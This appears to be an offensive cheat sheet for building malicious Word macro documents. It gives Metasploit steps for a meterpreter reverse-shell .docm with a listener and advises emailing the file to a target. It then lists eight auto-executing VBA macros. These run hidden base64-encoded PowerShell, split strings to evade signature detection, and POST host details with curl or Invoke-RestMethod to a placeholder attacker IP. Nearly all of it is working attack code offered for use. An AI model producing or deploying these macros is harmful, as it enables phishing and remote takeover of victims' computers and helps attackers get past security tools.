# MS Word Malicious Macro Document Creation

### Example tool to create infected documents: 

#### 1) Metasploit

### Usage:

1) Enter metasploit console

        msfconsole

2) Specify the payload to use

        set payload windows/meterpreter/reverse_tcp

3) Use this module to create the malicious .docm file

        use exploit/multi/fileformat/office_word_macro

4) Set our IP address to listen for connections

        set LHOST ATTACKER_IP

5) Set our port to listen for connections

        set LPORT ATTACKER_PORT

6) Check the settings if they are properly configured

        show options

7) Run the module

        exploit

#### The word document with the embedded macro will be stored in:

 - /root/.msf4/local/msf.docm

8) Open another msfconsole session in another terminal and use the multi/handler module to catch incoming connections

        use exploit/multi/handler

9) Set the payload we used to create the file for the handler to recognise it

        set payload windows/meterpreter/reverse_tcp

10) Set connection information

        set LHOST ATTACKER_IP

        set LPORT ATTACKER_PORT

11) Check our settings again for good measure

        show options

12) Run the module

        exploit

### Then, send the malicious document via email (for example) to your target and wait for them to open it. Then profit

### Manual Macros

#### 1) Auto-Executing Powershell on Document Open

        Sub AutoOpen()
            MyMacro
        End Sub
        
        Sub Document_Open()
            MyMacro
        End Sub
        
        Sub MyMacro()
            CreateObject("Wscript.Shell").Run "powershell"
        End Sub

#### 2) Passing Command as a String Variable

        Sub AutoOpen()
            MyMacro
        End Sub
        
        Sub Document_Open()
            MyMacro
        End Sub
        
        Sub MyMacro()
            Dim cmdStr As String
            cmdStr = "[Your PowerShell Command]"
            CreateObject("Wscript.Shell").Run cmdStr
        End Sub

#### 3) Macro for PowerShell Reverse Shell using Encoded Command

        Sub AutoOpen()
            MyMacro
        End Sub
        
        Sub Document_Open()
            MyMacro
        End Sub
        
        Sub MyMacro()
            Dim encodedCmd As String
        
            encodedCmd = encodedCmd + "[Base64 Chunk 1]"
            encodedCmd = encodedCmd + "[Base64 Chunk 2]"
            encodedCmd = encodedCmd + "..."
            encodedCmd = encodedCmd + "[Base64 Chunk N]"
        
            CreateObject("Wscript.Shell").Run "powershell.exe -nop -w hidden -enc " & encodedCmd
        End Sub

#### 4) String Concatenation to Bypass Signature Detection

        Sub AutoOpen()
            MyMacro
        End Sub
        
        Sub Document_Open()
            MyMacro
        End Sub
        
        Sub MyMacro()
            Dim cmdStr As String
            cmdStr = "powe" & "rshe" & "ll.exe"
            cmdStr = cmdStr & " -nop -w hidden -enc " & "[Base64 Encoded Command]"
            CreateObject("Wscript.Shell").Run cmdStr
        End Sub

#### 5) Executing Encoded Commands without Direct PowerShell reference

        Sub AutoOpen()
            MyMacro
        End Sub
        
        Sub Document_Open()
            MyMacro
        End Sub
        
        Sub MyMacro()
            Dim cmdStr As String
            cmdStr = "cmd.exe /c ""powershell.exe -nop -w hidden -enc " & "[Base64 Encoded Command]" & """"
            CreateObject("Wscript.Shell").Run cmdStr
        End Sub

#### 6) Callback ping

This Macros file is just to get a callback from the victim and understand what is happening, it is not ideal for real operations but it is for testing purposes

        Sub MyMacro()
            Dim Command As String
            Command = "C:\Windows\System32\curl.exe http://[ATTACKER_IP]/worked"
            Shell Command, vbHide
        End Sub
        
        Sub AutoOpen()
            MyMacro
        End Sub
        
        Sub Document_Open()
            MyMacro
        End Sub

#### 7) Determine target architecture

We can use special non-malicious Macros to find the architecture of the target and therefore crafting the payloads and stagers correctly avoid running issues. Remember to run nc -nvlp 80 prior to delivering them.

        Option Explicit
        
        Sub SendProcessInfo()
            Dim processName As String, serverUrl As String, wmiService As Object, processList As Object, processItem As Object
            Dim result As String, is64Bit As Boolean
        
            serverUrl = "http://CHANGE TO YOUR IP" ' Change this to your server endpoint
            processName = "winword.exe" ' Replace with your process name
        
            ' Create WMI query and get process list
            Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
            Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")
        
            ' Check if process is found and determine 64-bit status
            If processList.Count > 0 Then
                For Each processItem In processList
                    is64Bit = InStr(1, processItem.CommandLine, "Program Files (x86)", vbTextCompare) = 0
                    result = "Process: " & processName & ", 64-bit: " & CStr(is64Bit)
                Next
            Else
                result = "Process not found."
            End If
        
            ' Execute cURL command
            Shell "cmd.exe /c curl -X POST -d """ & result & """ " & serverUrl, vbHide
        End Sub
        Sub AutoOpen()
            SendProcessInfo
        End Sub
        Sub DocumentOpen()
            SendProcessInfo
        End Sub

#### 8) Macro using powershell

        Option Explicit
        
        Sub SendProcessInfo()
            Dim processName As String
            Dim is64Bit As Boolean
            Dim result As String
            Dim wmiService As Object
            Dim processList As Object
            Dim processItem As Object
            Dim psCommand As String
        
            processName = "explorer.exe" ' Use uppercase for process name for consistency
            Set wmiService = GetObject("winmgmts:\\.\root\CIMV2")
            Set processList = wmiService.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '" & processName & "'")
        
            If processList.Count > 0 Then
                For Each processItem In processList
                    ' Check if the executable is located in "Program Files (x86)"
                    is64Bit = (InStr(1, processItem.ExecutablePath, "Program Files (x86)", vbTextCompare) = 0)
                    Exit For ' Only need to check the first matching process
                Next processItem
                result = "{""process"": """ & processName & """, ""64bit"": " & CStr(is64Bit) & "}"
            Else
                result = "{""process"": """ & processName & """, ""status"": ""not found""}"
            End If
        
            ' Prepare the PowerShell command
            psCommand = "powershell -Command ""Invoke-RestMethod -Uri 'http://[ATTACKER_IP]' -Method Post -Body '" & result & "' -ContentType 'application/json'"""
        
            ' Execute the PowerShell command
            Shell "cmd.exe /c " & psCommand, vbHide
        End Sub
        
        Sub AutoOpen()
        SendProcessInfo
        End Sub
        Sub DocumentOpen()
        SendProcessInfo
        End Sub
